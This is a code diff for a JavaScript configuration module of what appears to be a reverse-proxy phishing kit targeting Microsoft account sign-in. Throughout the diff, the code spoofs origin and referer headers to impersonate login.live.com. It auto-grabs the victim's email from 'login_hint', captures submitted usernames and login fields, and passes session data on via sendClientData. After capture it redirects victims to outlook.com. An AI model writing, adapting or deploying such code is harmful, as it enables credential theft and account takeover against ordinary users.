@@ -10,33 +10,26 @@ const globalWorker = process.HOOK_JS_MODULE
 
 
 /** Important Defaults */
-const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {
-
-    constructor(proxyEndpoint, browserReq) {
-        super(proxyEndpoint, browserReq)
-    }
-
-    processRequest() {
-        return super.processRequest()
-
-    }
-}
-
 const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
 
     constructor(proxyResp, browserEndPoint) {
 
         super(proxyResp, browserEndPoint)
-        this.regexes = [
-             {
-                reg: /https:\/\/account.live.com\/identity\/confirm/igm, // Google chrome on windows fix
-                replacement: '/identity/confirm/'
-             },
-        ]
+        // this.regexes = [
+        //      {
+        //         reg: /https:\/\/account.live.com\/identity\/confirm/igm,
+        //         replacement: '/identity/confirm/'
+        //      },
+
+        //      {
+        //         reg: /https:\/\/logincdn.msftauth.net/igm,
+        //         replacement: '/logincdn/'
+        //      },
+        // ]
     }
 
 
-    processResponse() {
+    processResponse(clientContext) {
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
@@ -50,28 +43,30 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             }
         }
 
-        let appHeaders = this.browserEndPoint.getHeaders()['set-cookie'] || []
-        appHeaders = appHeaders.filter(appSingleHeader => {
-            return !appSingleHeader.startsWith('OParams=')
-        })
-        this.browserEndPoint.setHeader('set-cookie', appHeaders)
+        return super.processResponse(clientContext)
+
+        // let appHeaders = this.browserEndPoint.getHeaders()['set-cookie'] || []
+        // appHeaders = appHeaders.filter(appSingleHeader => {
+        //     return !appSingleHeader.startsWith('OParams=')
+        // })
+        // this.browserEndPoint.setHeader('set-cookie', appHeaders)
 
 
         // this.browserEndPoint.removeHeader('content-security-policy')
-        let newMsgBody;
-        return this.superPrepareResponse(true)
-            .then((msgBody) => {
-                newMsgBody = msgBody
-                for (let i = 0; i < this.regexes.length; i += 1) {
-                    const regExObj = this.regexes[i]
-                    if (regExObj.reg.test(newMsgBody)) {
-                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
-                    }
-                }
-                this.superFinishResponse(newMsgBody)
-            }).catch((err) => {
-            console.error(err)
-        })
+        // let newMsgBody;
+        // return this.superPrepareResponse(true)
+        //     .then((msgBody) => {
+        //         newMsgBody = msgBody
+        //         for (let i = 0; i < this.regexes.length; i += 1) {
+        //             const regExObj = this.regexes[i]
+        //             if (regExObj.reg.test(newMsgBody)) {
+        //                 newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
+        //             }
+        //         }
+        //         this.superFinishResponse(newMsgBody)
+        //     }).catch((err) => {
+        //     console.error(err)
+        // })
     }
 
     afterEmailPath() {
@@ -94,19 +89,15 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
-        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36'
 
-        this.req.headers['accept-encoding'] = 'gzip, br'
-        if (this.req.method === 'POST') {
-            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            if (this.req.url.startsWith('/ppsecure/post.srf?')) {
-                super.uploadRequestBody(clientContext.currentDomain, clientContext)
-                clientContext.setLogAvailable(true)
-            }
-            
-            super.captureBody(clientContext.currentDomain, clientContext)
+        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
 
-        }
+
+        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
+        this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'login.live.com') : ''
+        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'login.live.com') : ''
+
+
         if (this.req.url.startsWith('/identity/confirm')) {
             clientContext.currentDomain = 'account.live.com'
 
@@ -124,8 +115,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
             if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
                 super.sendClientData(clientContext, {})
-                this.res.writeHead('301', { location: 'https://outlook.com' })
-                return this.res.end()
+                return super.exitLink('https://outlook.com')
             }
         }
         
@@ -133,10 +123,10 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         if (this.req.url === '/auth0/outlook/owa2') {
             super.sendClientData(clientContext, {})
             this.res.writeHead('301', { location: 'https://outlook.com' })
-            return this.res.end()
+            return super.cleanEnd('PHP-EXEC', clientContext)
         }
 
-        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+        return super.execute(clientContext)
 
     }
 }
@@ -146,18 +136,52 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 const configExport = {
     CURRENT_DOMAIN: 'login.microsoftonline.com',
+    
+    SCHEME: 'outlook',
+
 
     EXTERNAL_FILTERS: 
     [
         'account.live.com',
+        'login.live.com'
     ],
 
-    START_PATH: '/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',
+    // AUTOGRAB_CODE: 'username',
+    AUTOGRAB_CODE: 'login_hint',
 
-    PRE_HANDLERS:
-        [
-        ],
-    PROXY_REQUEST: ProxyRequest,
+
+    START_PATH: '/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',
+    PATTERNS: [
+        {
+            match: "https://account.live.com/identity/confirm",
+            replace: '/identity/confirm/'
+         },
+
+        //  {
+        //     match: /https:\/\/logincdn.msftauth.net/igm,
+        //     replace: '/logincdn/'
+        //  },
+    ],
+
+    EXTRA_COMMANDS: [
+        
+        {
+            path: '/identity/confirm',
+            command: 'CHANGE_DOMAIN',
+            command_args: {
+                new_domain: 'account.live.com',
+                persistent: true,
+                },
+        },
+
+        {
+            path: '/GetCredentialType.srf.*',
+            command: 'DONOT_SEND_INFO',
+            command_args: {},
+        },
+
+    ],
+
     PROXY_RESPONSE: ProxyResponse,
     DEFAULT_PRE_HANDLER: DefaultPreHandler,
 
@@ -165,6 +189,12 @@ const configExport = {
         loginUserName: {
             method: 'POST',
             params: ['username'],
+            urls: '',
+            hosts: ['login.live.com'],
+        },
+        loginID: {
+            method: 'POST',
+            params: ['login'],
             urls: '',
             hosts: ['login.live.com'],
         },
@@ -189,7 +219,17 @@ const configExport = {
             urls: ['/web'],
             hosts: 'PHP-EXEC',
         },
+
     },
+    cookieKEY: 'loginUsername',
+
+     //MODULE OPTIONS
+     MODULE_ENABLED: true,
+
+     MODULE_OPTIONS: {
+         startPath: this.START_PATH,
+         exitLink: '',
+     },
 
     // proxyDomain: process.env.PROXY_DOMAIN,
 }
